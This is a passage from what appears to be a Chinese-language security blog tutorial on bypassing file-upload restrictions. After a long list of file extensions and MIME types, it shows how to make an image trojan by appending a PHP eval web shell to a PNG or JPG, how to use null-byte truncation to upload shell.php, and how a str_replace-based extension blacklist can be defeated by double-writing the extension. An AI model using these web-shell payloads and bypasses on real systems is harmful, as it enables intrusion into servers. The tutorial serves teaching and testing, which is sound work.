&quot;application/x-gtar&quot;), (&quot;hdf&quot;, &quot;application/x-hdf&quot;),</span><br><span class="line">         (&quot;phtml&quot;, &quot;application/x-httpd-php&quot;),</span><br><span class="line">         (&quot;pht&quot;, &quot;application/x-httpd-php&quot;), (&quot;php&quot;, &quot;application/x-httpd-php&quot;),</span><br><span class="line">         (&quot;phps&quot;, &quot;application/x-httpd-php-source&quot;),</span><br><span class="line">         (&quot;php3&quot;, &quot;application/x-httpd-php3&quot;),</span><br><span class="line">         (&quot;php3p&quot;, &quot;application/x-httpd-php3-preprocessed&quot;),</span><br><span class="line">         (&quot;php4&quot;, &quot;application/x-httpd-php4&quot;),</span><br><span class="line">         (&quot;php5&quot;, &quot;application/x-httpd-php5&quot;), (&quot;ica&quot;, &quot;application/x-ica&quot;),</span><br><span class="line">         (&quot;info&quot;, &quot;application/x-info&quot;),</span><br><span class="line">         (&quot;ins&quot;, &quot;application/x-internet-signup&quot;),</span><br><span class="line">         (&quot;isp&quot;, &quot;application/x-internet-signup&quot;),</span><br><span class="line">         (&quot;iii&quot;, &quot;application/x-iphone&quot;),</span><br><span class="line">         (&quot;iso&quot;, &quot;application/x-iso9660-image&quot;), (&quot;jam&quot;, &quot;application/x-jam&quot;),</span><br><span class="line">         (&quot;jnlp&quot;, &quot;application/x-java-jnlp-file&quot;),</span><br><span class="line">         (&quot;jmz&quot;, &quot;application/x-jmol&quot;), (&quot;chrt&quot;, &quot;application/x-kchart&quot;),</span><br><span class="line">         (&quot;kil&quot;, &quot;application/x-killustrator&quot;), (&quot;skp&quot;, &quot;application/x-koan&quot;),</span><br><span class="line">         (&quot;skd&quot;, &quot;application/x-koan&quot;), (&quot;skt&quot;, &quot;application/x-koan&quot;),</span><br><span class="line">         (&quot;skm&quot;, &quot;application/x-koan&quot;), (&quot;kpr&quot;, &quot;application/x-kpresenter&quot;),</span><br><span class="line">         (&quot;kpt&quot;, &quot;application/x-kpresenter&quot;), (&quot;ksp&quot;, &quot;application/x-kspread&quot;),</span><br><span class="line">         (&quot;kwd&quot;, &quot;application/x-kword&quot;), (&quot;kwt&quot;, &quot;application/x-kword&quot;),</span><br><span class="line">         (&quot;latex&quot;, &quot;application/x-latex&quot;), (&quot;lha&quot;, &quot;application/x-lha&quot;),</span><br><span class="line">         (&quot;lyx&quot;, &quot;application/x-lyx&quot;), (&quot;lzh&quot;, &quot;application/x-lzh&quot;),</span><br><span class="line">         (&quot;lzx&quot;, &quot;application/x-lzx&quot;), (&quot;frm&quot;, &quot;application/x-maker&quot;),</span><br><span class="line">         (&quot;maker&quot;, &quot;application/x-maker&quot;), (&quot;frame&quot;, &quot;application/x-maker&quot;),</span><br><span class="line">         (&quot;fm&quot;, &quot;application/x-maker&quot;), (&quot;fb&quot;, &quot;application/x-maker&quot;),</span><br><span class="line">         (&quot;book&quot;, &quot;application/x-maker&quot;), (&quot;fbdoc&quot;, &quot;application/x-maker&quot;),</span><br><span class="line">         (&quot;mif&quot;, &quot;application/x-mif&quot;), (&quot;wmd&quot;, &quot;application/x-ms-wmd&quot;),</span><br><span class="line">         (&quot;wmz&quot;, &quot;application/x-ms-wmz&quot;),</span><br><span class="line">         (&quot;com&quot;, &quot;application/x-msdos-program&quot;),</span><br><span class="line">         (&quot;exe&quot;, &quot;application/x-msdos-program&quot;),</span><br><span class="line">         (&quot;bat&quot;, &quot;application/x-msdos-program&quot;),</span><br><span class="line">         (&quot;dll&quot;, &quot;application/x-msdos-program&quot;), (&quot;msi&quot;, &quot;application/x-msi&quot;),</span><br><span class="line">         (&quot;nc&quot;, &quot;application/x-netcdf&quot;),</span><br><span class="line">         (&quot;pac&quot;, &quot;application/x-ns-proxy-autoconfig&quot;),</span><br><span class="line">         (&quot;dat&quot;, &quot;application/x-ns-proxy-autoconfig&quot;),</span><br><span class="line">         (&quot;nwc&quot;, &quot;application/x-nwc&quot;), (&quot;o&quot;, &quot;application/x-object&quot;),</span><br><span class="line">         (&quot;oza&quot;, &quot;application/x-oz-application&quot;),</span><br><span class="line">         (&quot;p7r&quot;, &quot;application/x-pkcs7-certreqresp&quot;),</span><br><span class="line">         (&quot;crl&quot;, &quot;application/x-pkcs7-crl&quot;),</span><br><span class="line">         (&quot;pyc&quot;, &quot;application/x-python-code&quot;),</span><br><span class="line">         (&quot;pyo&quot;, &quot;application/x-python-code&quot;), (&quot;qgs&quot;, &quot;application/x-qgis&quot;),</span><br><span class="line">         (&quot;shp&quot;, &quot;application/x-qgis&quot;), (&quot;shx&quot;, &quot;application/x-qgis&quot;),</span><br><span class="line">         (&quot;qtl&quot;, &quot;application/x-quicktimeplayer&quot;),</span><br><span class="line">         (&quot;rpm&quot;, &quot;application/x-redhat-package-manager&quot;),</span><br><span class="line">         (&quot;rb&quot;, &quot;application/x-ruby&quot;), (&quot;sh&quot;, &quot;application/x-sh&quot;),</span><br><span class="line">         (&quot;shar&quot;, &quot;application/x-shar&quot;),</span><br><span class="line">         (&quot;swf&quot;, &quot;application/x-shockwave-flash&quot;),</span><br><span class="line">         (&quot;swfl&quot;, &quot;application/x-shockwave-flash&quot;),</span><br><span class="line">         (&quot;scr&quot;, &quot;application/x-silverlight&quot;), (&quot;sit&quot;, &quot;application/x-stuffit&quot;),</span><br><span class="line">         (&quot;sitx&quot;, &quot;application/x-stuffit&quot;),</span><br><span class="line">         (&quot;sv4cpio&quot;, &quot;application/x-sv4cpio&quot;),</span><br><span class="line">         (&quot;sv4crc&quot;, &quot;application/x-sv4crc&quot;), (&quot;tar&quot;, &quot;application/x-tar&quot;),</span><br><span class="line">         (&quot;tcl&quot;, &quot;application/x-tcl&quot;), (&quot;gf&quot;, &quot;application/x-tex-gf&quot;),</span><br><span class="line">         (&quot;pk&quot;, &quot;application/x-tex-pk&quot;), (&quot;texinfo&quot;, &quot;application/x-texinfo&quot;),</span><br><span class="line">         (&quot;texi&quot;, &quot;application/x-texinfo&quot;), (&quot;~&quot;, &quot;application/x-trash&quot;),</span><br><span class="line">         (&quot;%&quot;, &quot;application/x-trash&quot;), (&quot;bak&quot;, &quot;application/x-trash&quot;),</span><br><span class="line">         (&quot;old&quot;, &quot;application/x-trash&quot;), (&quot;sik&quot;, &quot;application/x-trash&quot;),</span><br><span class="line">         (&quot;t&quot;, &quot;application/x-troff&quot;), (&quot;tr&quot;, &quot;application/x-troff&quot;),</span><br><span class="line">         (&quot;roff&quot;, &quot;application/x-troff&quot;), (&quot;man&quot;, &quot;application/x-troff-man&quot;),</span><br><span class="line">         (&quot;me&quot;, &quot;application/x-troff-me&quot;), (&quot;ms&quot;, &quot;application/x-troff-ms&quot;),</span><br><span class="line">         (&quot;ustar&quot;, &quot;application/x-ustar&quot;), (&quot;src&quot;, &quot;application/x-wais-source&quot;),</span><br><span class="line">         (&quot;wz&quot;, &quot;application/x-wingz&quot;), (&quot;crt&quot;, &quot;application/x-x509-ca-cert&quot;),</span><br><span class="line">         (&quot;xcf&quot;, &quot;application/x-xcf&quot;), (&quot;fig&quot;, &quot;application/x-xfig&quot;),</span><br><span class="line">         (&quot;xpi&quot;, &quot;application/x-xpinstall&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;),</span><br><span class="line">         (&quot;awb&quot;, &quot;audio/amr-wb&quot;), (&quot;amr&quot;, &quot;audio/amr&quot;), (&quot;awb&quot;, &quot;audio/amr-wb&quot;),</span><br><span class="line">         (&quot;axa&quot;, &quot;audio/annodex&quot;), (&quot;au&quot;, &quot;audio/basic&quot;),</span><br><span class="line">         (&quot;snd&quot;, &quot;audio/basic&quot;), (&quot;flac&quot;, &quot;audio/flac&quot;), (&quot;mid&quot;, &quot;audio/midi&quot;),</span><br><span class="line">         (&quot;midi&quot;, &quot;audio/midi&quot;), (&quot;kar&quot;, &quot;audio/midi&quot;), (&quot;mpga&quot;, &quot;audio/mpeg&quot;),</span><br><span class="line">         (&quot;mpega&quot;, &quot;audio/mpeg&quot;), (&quot;mp2&quot;, &quot;audio/mpeg&quot;), (&quot;mp3&quot;, &quot;audio/mpeg&quot;),</span><br><span class="line">         (&quot;m4a&quot;, &quot;audio/mpeg&quot;), (&quot;m3u&quot;, &quot;audio/mpegurl&quot;), (&quot;oga&quot;, &quot;audio/ogg&quot;),</span><br><span class="line">         (&quot;ogg&quot;, &quot;audio/ogg&quot;), (&quot;spx&quot;, &quot;audio/ogg&quot;), (&quot;sid&quot;, &quot;audio/prs.sid&quot;),</span><br><span class="line">         (&quot;aif&quot;, &quot;audio/x-aiff&quot;), (&quot;aiff&quot;, &quot;audio/x-aiff&quot;),</span><br><span class="line">         (&quot;aifc&quot;, &quot;audio/x-aiff&quot;), (&quot;gsm&quot;, &quot;audio/x-gsm&quot;),</span><br><span class="line">         (&quot;m3u&quot;, &quot;audio/x-mpegurl&quot;), (&quot;wma&quot;, &quot;audio/x-ms-wma&quot;),</span><br><span class="line">         (&quot;wax&quot;, &quot;audio/x-ms-wax&quot;), (&quot;ra&quot;, &quot;audio/x-pn-realaudio&quot;),</span><br><span class="line">         (&quot;rm&quot;, &quot;audio/x-pn-realaudio&quot;), (&quot;ram&quot;, &quot;audio/x-pn-realaudio&quot;),</span><br><span class="line">         (&quot;ra&quot;, &quot;audio/x-realaudio&quot;), (&quot;pls&quot;, &quot;audio/x-scpls&quot;),</span><br><span class="line">         (&quot;sd2&quot;, &quot;audio/x-sd2&quot;), (&quot;wav&quot;, &quot;audio/x-wav&quot;),</span><br><span class="line">         (&quot;alc&quot;, &quot;chemical/x-alchemy&quot;), (&quot;cac&quot;, &quot;chemical/x-cache&quot;),</span><br><span class="line">         (&quot;cache&quot;, &quot;chemical/x-cache&quot;), (&quot;csf&quot;, &quot;chemical/x-cache-csf&quot;),</span><br><span class="line">         (&quot;cbin&quot;, &quot;chemical/x-cactvs-binary&quot;),</span><br><span class="line">         (&quot;cascii&quot;, &quot;chemical/x-cactvs-binary&quot;),</span><br><span class="line">         (&quot;ctab&quot;, &quot;chemical/x-cactvs-binary&quot;), (&quot;cdx&quot;, &quot;chemical/x-cdx&quot;),</span><br><span class="line">         (&quot;cer&quot;, &quot;chemical/x-cerius&quot;), (&quot;c3d&quot;, &quot;chemical/x-chem3d&quot;),</span><br><span class="line">         (&quot;chm&quot;, &quot;chemical/x-chemdraw&quot;), (&quot;cif&quot;, &quot;chemical/x-cif&quot;),</span><br><span class="line">         (&quot;cmdf&quot;, &quot;chemical/x-cmdf&quot;), (&quot;cml&quot;, &quot;chemical/x-cml&quot;),</span><br><span class="line">         (&quot;cpa&quot;, &quot;chemical/x-compass&quot;), (&quot;bsd&quot;, &quot;chemical/x-crossfire&quot;),</span><br><span class="line">         (&quot;csml&quot;, &quot;chemical/x-csml&quot;), (&quot;csm&quot;, &quot;chemical/x-csml&quot;),</span><br><span class="line">         (&quot;ctx&quot;, &quot;chemical/x-ctx&quot;), (&quot;cxf&quot;, &quot;chemical/x-cxf&quot;),</span><br><span class="line">         (&quot;cef&quot;, &quot;chemical/x-cxf&quot;), (&quot;smi&quot;, &quot;#chemical/x-daylight-smiles&quot;),</span><br><span class="line">         (&quot;emb&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;),</span><br><span class="line">         (&quot;embl&quot;, &quot;chemical/x-embl-dl-nucleotide&quot;),</span><br><span class="line">         (&quot;spc&quot;, &quot;chemical/x-galactic-spc&quot;), (&quot;inp&quot;, &quot;chemical/x-gamess-input&quot;),</span><br><span class="line">         (&quot;gam&quot;, &quot;chemical/x-gamess-input&quot;),</span><br><span class="line">         (&quot;gamin&quot;, &quot;chemical/x-gamess-input&quot;),</span><br><span class="line">         (&quot;fch&quot;, &quot;chemical/x-gaussian-checkpoint&quot;),</span><br><span class="line">         (&quot;fchk&quot;, &quot;chemical/x-gaussian-checkpoint&quot;),</span><br><span class="line">         (&quot;cub&quot;, &quot;chemical/x-gaussian-cube&quot;),</span><br><span class="line">         (&quot;gau&quot;, &quot;chemical/x-gaussian-input&quot;),</span><br><span class="line">         (&quot;gjc&quot;, &quot;chemical/x-gaussian-input&quot;),</span><br><span class="line">         (&quot;gjf&quot;, &quot;chemical/x-gaussian-input&quot;),</span><br><span class="line">         (&quot;gal&quot;, &quot;chemical/x-gaussian-log&quot;),</span><br><span class="line">         (&quot;gcg&quot;, &quot;chemical/x-gcg8-sequence&quot;), (&quot;gen&quot;, &quot;chemical/x-genbank&quot;),</span><br><span class="line">         (&quot;hin&quot;, &quot;chemical/x-hin&quot;), (&quot;istr&quot;, &quot;chemical/x-isostar&quot;),</span><br><span class="line">         (&quot;ist&quot;, &quot;chemical/x-isostar&quot;), (&quot;jdx&quot;, &quot;chemical/x-jcamp-dx&quot;),</span><br><span class="line">         (&quot;dx&quot;, &quot;chemical/x-jcamp-dx&quot;), (&quot;kin&quot;, &quot;chemical/x-kinemage&quot;),</span><br><span class="line">         (&quot;mcm&quot;, &quot;chemical/x-macmolecule&quot;),</span><br><span class="line">         (&quot;mmd&quot;, &quot;chemical/x-macromodel-input&quot;),</span><br><span class="line">         (&quot;mmod&quot;, &quot;chemical/x-macromodel-input&quot;),</span><br><span class="line">         (&quot;mol&quot;, &quot;chemical/x-mdl-molfile&quot;), (&quot;rd&quot;, &quot;chemical/x-mdl-rdfile&quot;),</span><br><span class="line">         (&quot;rxn&quot;, &quot;chemical/x-mdl-rxnfile&quot;), (&quot;sd&quot;, &quot;chemical/x-mdl-sdfile&quot;),</span><br><span class="line">         (&quot;sdf&quot;, &quot;chemical/x-mdl-sdfile&quot;), (&quot;tgf&quot;, &quot;chemical/x-mdl-tgf&quot;),</span><br><span class="line">         (&quot;mif&quot;, &quot;#chemical/x-mif&quot;), (&quot;mcif&quot;, &quot;chemical/x-mmcif&quot;),</span><br><span class="line">         (&quot;mol2&quot;, &quot;chemical/x-mol2&quot;), (&quot;b&quot;, &quot;chemical/x-molconn-Z&quot;),</span><br><span class="line">         (&quot;gpt&quot;, &quot;chemical/x-mopac-graph&quot;), (&quot;mop&quot;, &quot;chemical/x-mopac-input&quot;),</span><br><span class="line">         (&quot;mopcrt&quot;, &quot;chemical/x-mopac-input&quot;),</span><br><span class="line">         (&quot;mpc&quot;, &quot;chemical/x-mopac-input&quot;), (&quot;zmt&quot;, &quot;chemical/x-mopac-input&quot;),</span><br><span class="line">         (&quot;moo&quot;, &quot;chemical/x-mopac-out&quot;), (&quot;mvb&quot;, &quot;chemical/x-mopac-vib&quot;),</span><br><span class="line">         (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1&quot;), (&quot;prt&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;),</span><br><span class="line">         (&quot;ent&quot;, &quot;chemical/x-ncbi-asn1-ascii&quot;),</span><br><span class="line">         (&quot;val&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;),</span><br><span class="line">         (&quot;aso&quot;, &quot;chemical/x-ncbi-asn1-binary&quot;),</span><br><span class="line">         (&quot;asn&quot;, &quot;chemical/x-ncbi-asn1-spec&quot;), (&quot;pdb&quot;, &quot;chemical/x-pdb&quot;),</span><br><span class="line">         (&quot;ent&quot;, &quot;chemical/x-pdb&quot;), (&quot;ros&quot;, &quot;chemical/x-rosdal&quot;),</span><br><span class="line">         (&quot;sw&quot;, &quot;chemical/x-swissprot&quot;), (&quot;vms&quot;, &quot;chemical/x-vamas-iso14976&quot;),</span><br><span class="line">         (&quot;vmd&quot;, &quot;chemical/x-vmd&quot;), (&quot;xtel&quot;, &quot;chemical/x-xtel&quot;),</span><br><span class="line">         (&quot;xyz&quot;, &quot;chemical/x-xyz&quot;), (&quot;gif&quot;, &quot;image/gif&quot;), (&quot;ief&quot;, &quot;image/ief&quot;),</span><br><span class="line">         (&quot;jpeg&quot;, &quot;image/jpeg&quot;), (&quot;jpg&quot;, &quot;image/jpeg&quot;), (&quot;jpe&quot;, &quot;image/jpeg&quot;),</span><br><span class="line">         (&quot;pcx&quot;, &quot;image/pcx&quot;), (&quot;png&quot;, &quot;image/png&quot;), (&quot;svg&quot;, &quot;image/svg+xml&quot;),</span><br><span class="line">         (&quot;svgz&quot;, &quot;image/svg+xml&quot;), (&quot;tiff&quot;, &quot;image/tiff&quot;),</span><br><span class="line">         (&quot;tif&quot;, &quot;image/tiff&quot;), (&quot;djvu&quot;, &quot;image/vnd.djvu&quot;),</span><br><span class="line">         (&quot;djv&quot;, &quot;image/vnd.djvu&quot;), (&quot;wbmp&quot;, &quot;image/vnd.wap.wbmp&quot;),</span><br><span class="line">         (&quot;cr2&quot;, &quot;image/x-canon-cr2&quot;), (&quot;crw&quot;, &quot;image/x-canon-crw&quot;),</span><br><span class="line">         (&quot;ras&quot;, &quot;image/x-cmu-raster&quot;), (&quot;cdr&quot;, &quot;image/x-coreldraw&quot;),</span><br><span class="line">         (&quot;pat&quot;, &quot;image/x-coreldrawpattern&quot;),</span><br><span class="line">         (&quot;cdt&quot;, &quot;image/x-coreldrawtemplate&quot;),</span><br><span class="line">         (&quot;cpt&quot;, &quot;image/x-corelphotopaint&quot;), (&quot;erf&quot;, &quot;image/x-epson-erf&quot;),</span><br><span class="line">         (&quot;ico&quot;, &quot;image/x-icon&quot;), (&quot;art&quot;, &quot;image/x-jg&quot;), (&quot;jng&quot;, &quot;image/x-jng&quot;),</span><br><span class="line">         (&quot;bmp&quot;, &quot;image/x-ms-bmp&quot;), (&quot;nef&quot;, &quot;image/x-nikon-nef&quot;),</span><br><span class="line">         (&quot;orf&quot;, &quot;image/x-olympus-orf&quot;), (&quot;psd&quot;, &quot;image/x-photoshop&quot;),</span><br><span class="line">         (&quot;pnm&quot;, &quot;image/x-portable-anymap&quot;), (&quot;pbm&quot;, &quot;image/x-portable-bitmap&quot;),</span><br><span class="line">         (&quot;pgm&quot;, &quot;image/x-portable-graymap&quot;),</span><br><span class="line">         (&quot;ppm&quot;, &quot;image/x-portable-pixmap&quot;), (&quot;rgb&quot;, &quot;image/x-rgb&quot;),</span><br><span class="line">         (&quot;xbm&quot;, &quot;image/x-xbitmap&quot;), (&quot;xpm&quot;, &quot;image/x-xpixmap&quot;),</span><br><span class="line">         (&quot;xwd&quot;, &quot;image/x-xwindowdump&quot;), (&quot;eml&quot;, &quot;message/rfc822&quot;),</span><br><span class="line">         (&quot;igs&quot;, &quot;model/iges&quot;), (&quot;iges&quot;, &quot;model/iges&quot;), (&quot;msh&quot;, &quot;model/mesh&quot;),</span><br><span class="line">         (&quot;mesh&quot;, &quot;model/mesh&quot;), (&quot;silo&quot;, &quot;model/mesh&quot;), (&quot;wrl&quot;, &quot;model/vrml&quot;),</span><br><span class="line">         (&quot;vrml&quot;, &quot;model/vrml&quot;), (&quot;x3dv&quot;, &quot;model/x3d+vrml&quot;),</span><br><span class="line">         (&quot;x3d&quot;, &quot;model/x3d+xml&quot;), (&quot;x3db&quot;, &quot;model/x3d+binary&quot;),</span><br><span class="line">         (&quot;manifest&quot;, &quot;text/cache-manifest&quot;), (&quot;ics&quot;, &quot;text/calendar&quot;),</span><br><span class="line">         (&quot;icz&quot;, &quot;text/calendar&quot;), (&quot;css&quot;, &quot;text/css&quot;), (&quot;csv&quot;, &quot;text/csv&quot;),</span><br><span class="line">         (&quot;323&quot;, &quot;text/h323&quot;), (&quot;html&quot;, &quot;text/html&quot;), (&quot;htm&quot;, &quot;text/html&quot;),</span><br><span class="line">         (&quot;shtml&quot;, &quot;text/html&quot;), (&quot;uls&quot;, &quot;text/iuls&quot;), (&quot;mml&quot;, &quot;text/mathml&quot;),</span><br><span class="line">         (&quot;asc&quot;, &quot;text/plain&quot;), (&quot;txt&quot;, &quot;text/plain&quot;), (&quot;text&quot;, &quot;text/plain&quot;),</span><br><span class="line">         (&quot;pot&quot;, &quot;text/plain&quot;), (&quot;brf&quot;, &quot;text/plain&quot;), (&quot;rtx&quot;, &quot;text/richtext&quot;),</span><br><span class="line">         (&quot;sct&quot;, &quot;text/scriptlet&quot;), (&quot;wsc&quot;, &quot;text/scriptlet&quot;),</span><br><span class="line">         (&quot;tm&quot;, &quot;text/texmacs&quot;), (&quot;ts&quot;, &quot;text/texmacs&quot;),</span><br><span class="line">         (&quot;tsv&quot;, &quot;text/tab-separated-values&quot;),</span><br><span class="line">         (&quot;jad&quot;, &quot;text/vnd.sun.j2me.app-descriptor&quot;),</span><br><span class="line">         (&quot;wml&quot;, &quot;text/vnd.wap.wml&quot;), (&quot;wmls&quot;, &quot;text/vnd.wap.wmlscript&quot;),</span><br><span class="line">         (&quot;bib&quot;, &quot;text/x-bibtex&quot;), (&quot;boo&quot;, &quot;text/x-boo&quot;),</span><br><span class="line">         (&quot;h++&quot;, &quot;text/x-c++hdr&quot;), (&quot;hpp&quot;, &quot;text/x-c++hdr&quot;),</span><br><span class="line">         (&quot;hxx&quot;, &quot;text/x-c++hdr&quot;), (&quot;hh&quot;, &quot;text/x-c++hdr&quot;),</span><br><span class="line">         (&quot;c++&quot;, &quot;text/x-c++src&quot;), (&quot;cpp&quot;, &quot;text/x-c++src&quot;),</span><br><span class="line">         (&quot;cxx&quot;, &quot;text/x-c++src&quot;), (&quot;cc&quot;, &quot;text/x-c++src&quot;),</span><br><span class="line">         (&quot;h&quot;, &quot;text/x-chdr&quot;), (&quot;htc&quot;, &quot;text/x-component&quot;),</span><br><span class="line">         (&quot;csh&quot;, &quot;text/x-csh&quot;), (&quot;c&quot;, &quot;text/x-csrc&quot;), (&quot;d&quot;, &quot;text/x-dsrc&quot;),</span><br><span class="line">         (&quot;diff&quot;, &quot;text/x-diff&quot;), (&quot;patch&quot;, &quot;text/x-diff&quot;),</span><br><span class="line">         (&quot;hs&quot;, &quot;text/x-haskell&quot;), (&quot;java&quot;, &quot;text/x-java&quot;),</span><br><span class="line">         (&quot;lhs&quot;, &quot;text/x-literate-haskell&quot;), (&quot;moc&quot;, &quot;text/x-moc&quot;),</span><br><span class="line">         (&quot;p&quot;, &quot;text/x-pascal&quot;), (&quot;pas&quot;, &quot;text/x-pascal&quot;),</span><br><span class="line">         (&quot;gcd&quot;, &quot;text/x-pcs-gcd&quot;), (&quot;pl&quot;, &quot;text/x-perl&quot;),</span><br><span class="line">         (&quot;pm&quot;, &quot;text/x-perl&quot;), (&quot;py&quot;, &quot;text/x-python&quot;),</span><br><span class="line">         (&quot;scala&quot;, &quot;text/x-scala&quot;), (&quot;etx&quot;, &quot;text/x-setext&quot;),</span><br><span class="line">         (&quot;sh&quot;, &quot;text/x-sh&quot;), (&quot;tcl&quot;, &quot;text/x-tcl&quot;), (&quot;tk&quot;, &quot;text/x-tcl&quot;),</span><br><span class="line">         (&quot;tex&quot;, &quot;text/x-tex&quot;), (&quot;ltx&quot;, &quot;text/x-tex&quot;), (&quot;sty&quot;, &quot;text/x-tex&quot;),</span><br><span class="line">         (&quot;cls&quot;, &quot;text/x-tex&quot;), (&quot;vcs&quot;, &quot;text/x-vcalendar&quot;),</span><br><span class="line">         (&quot;vcf&quot;, &quot;text/x-vcard&quot;), (&quot;3gp&quot;, &quot;video/3gpp&quot;),</span><br><span class="line">         (&quot;axv&quot;, &quot;video/annodex&quot;), (&quot;dl&quot;, &quot;video/dl&quot;), (&quot;dif&quot;, &quot;video/dv&quot;),</span><br><span class="line">         (&quot;dv&quot;, &quot;video/dv&quot;), (&quot;fli&quot;, &quot;video/fli&quot;), (&quot;gl&quot;, &quot;video/gl&quot;),</span><br><span class="line">         (&quot;mpeg&quot;, &quot;video/mpeg&quot;), (&quot;mpg&quot;, &quot;video/mpeg&quot;), (&quot;mpe&quot;, &quot;video/mpeg&quot;),</span><br><span class="line">         (&quot;mp4&quot;, &quot;video/mp4&quot;), (&quot;qt&quot;, &quot;video/quicktime&quot;),</span><br><span class="line">         (&quot;mov&quot;, &quot;video/quicktime&quot;), (&quot;ogv&quot;, &quot;video/ogg&quot;),</span><br><span class="line">         (&quot;mxu&quot;, &quot;video/vnd.mpegurl&quot;), (&quot;flv&quot;, &quot;video/x-flv&quot;),</span><br><span class="line">         (&quot;lsf&quot;, &quot;video/x-la-asf&quot;), (&quot;lsx&quot;, &quot;video/x-la-asf&quot;),</span><br><span class="line">         (&quot;mng&quot;, &quot;video/x-mng&quot;), (&quot;asf&quot;, &quot;video/x-ms-asf&quot;),</span><br><span class="line">         (&quot;asx&quot;, &quot;video/x-ms-asf&quot;), (&quot;wm&quot;, &quot;video/x-ms-wm&quot;),</span><br><span class="line">         (&quot;wmv&quot;, &quot;video/x-ms-wmv&quot;), (&quot;wmx&quot;, &quot;video/x-ms-wmx&quot;),</span><br><span class="line">         (&quot;wvx&quot;, &quot;video/x-ms-wvx&quot;), (&quot;avi&quot;, &quot;video/x-msvideo&quot;),</span><br><span class="line">         (&quot;movie&quot;, &quot;video/x-sgi-movie&quot;), (&quot;mpv&quot;, &quot;video/x-matroska&quot;),</span><br><span class="line">         (&quot;mkv&quot;, &quot;video/x-matroska&quot;), (&quot;ice&quot;, &quot;x-conference/x-cooltalk&quot;),</span><br><span class="line">         (&quot;sisx&quot;, &quot;x-epoc/x-sisx-app&quot;), (&quot;vrm&quot;, &quot;x-world/x-vrml&quot;),</span><br><span class="line">         (&quot;vrml&quot;, &quot;x-world/x-vrml&quot;), (&quot;wrl&quot;, &quot;x-world/x-vrml&quot;)]</span><br></pre></td></tr></table></figure><h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a><strong>文件头检查</strong></h2><p>文件头检查只对文件头进行基本的校验：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714151516712.png" alt="image-20200714151516712"></p><p>常见的文件头：</p><table><thead><tr><th>后缀</th><th>文件头</th><th>文本类型</th></tr></thead><tbody><tr><td>PNG</td><td>89504E47</td><td>‰[不可显示字符]PNG</td></tr><tr><td>GIF</td><td>47494638</td><td>GIF8</td></tr><tr><td>JPEG</td><td>FFD8FF</td><td>ÿØÿ</td></tr></tbody></table><h3 id="图马的制作"><a href="#图马的制作" class="headerlink" title="图马的制作"></a>图马的制作</h3><ul><li><strong>Windows</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy pic.jpg/b+shell.php/a shell.jpg</span><br></pre></td></tr></table></figure><blockquote><p>参数<code>/b</code>指定以二进制格式复制、合并文件， 用于图像类/声音类文件</p><p>参数<code>/a</code>指定以 ASCII 格式复制、合并文件，用于 txt 等文本类文件</p></blockquote><ul><li>Linux</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop ls</span><br><span class="line">pic.png   shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝一个 shell.png 用于后面的操作</span></span><br><span class="line">➜  Desktop cp pic.png shell.png</span><br><span class="line"></span><br><span class="line">➜  Desktop ls</span><br><span class="line">pic.png   shell.php shell.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看一下 shell.php 内容</span></span><br><span class="line">➜  Desktop cat shell.php</span><br><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'x'</span>]) ?&gt;%</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 shell.php 内容追加到 shell.png 中</span></span><br><span class="line">➜  Desktop cat shell.php &gt;&gt; shell.png</span><br></pre></td></tr></table></figure><p>手动查看一下，发现图片尾部已经存在 WebShell 木马了：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714153624279.png" alt="image-20200714153624279"></p><p>手动生成的图马当然也是可以直接上传成功的：</p><p><img src="http://qiniuyun.lintstar.top/image-20200714153945635.png" alt="image-20200714153945635"></p><h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>PHP 5.2 存在 00 截断漏洞，截断也可以用来突破上传后缀限制。发现存在路径参数，一般设计到路径参数的多，大多数可以通过 00 截断路径来突破上传限制：</p><blockquote><p>/var/www/html/upload/shell.php%00</p><p>/var/www/html/upload/shell.php%00 shell.png</p></blockquote><p><img src="http://qiniuyun.lintstar.top/image-20200716121955937.png" alt="image-20200716121955937"></p><p>最终成功拿到 webshell</p><h2 id="双写后缀"><a href="#双写后缀" class="headerlink" title="双写后缀"></a>双写后缀</h2><p>可以看到上传功能的逻辑代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name = basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$blacklist = <span class="keyword">array</span>(<span class="string">"php"</span>, <span class="string">"php5"</span>, <span class="string">"php4"</span>, <span class="string">"php3"</span>, <span class="string">"phtml"</span>, <span class="string">"pht"</span>, <span class="string">"jsp"</span>, <span class="string">"jspa"</span>, <span class="string">"jspx"</span>, <span class="string">"jsw"</span>, <span class="string">"jsv"</span>, <span class="string">"jspf"</span>, <span class="string">"jtml"</span>, <span class="string">"asp"</span>, <span class="string">"aspx"</span>, <span class="string">"asa"</span>, <span class="string">"asax"</span>, <span class="string">"ascx"</span>, <span class="string">"ashx"</span>, <span class="string">"asmx"</span>, <span class="string">"cer"</span>, <span class="string">"swf"</span>, <span class="string">"htaccess"</span>, <span class="string">"ini"</span>);</span><br><span class="line">$name = str_replace($blacklist, <span class="string">""</span>, $name);</span><br></pre></td></tr></table></figure><p>发现一个经典的 BUG 写法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = str_replace($blacklist, <span 